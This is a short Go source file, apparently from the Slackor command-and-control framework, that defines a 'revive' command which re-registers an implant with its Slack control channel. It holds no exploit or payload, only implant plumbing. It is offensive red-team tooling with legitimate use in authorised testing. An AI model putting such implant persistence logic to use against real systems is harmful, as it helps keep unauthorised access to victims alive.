package common

import (
	"fmt"

	"github.com/Coalfire-Research/Slackor/internal/slack"
	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Revive reregisters the implant with the channel
type Revive struct{}

// Name is the name of the command
func (r Revive) Name() string {
	return "revive"
}

// Run reregisters the implant with the channel
func (r Revive) Run(clientID string, jobID string, args []string) (string, error) {
	slack.Register(clientID)
	return fmt.Sprintf("Reregistering %s.", clientID), nil
}

func init() {
	command.RegisterCommand(Revive{})
}
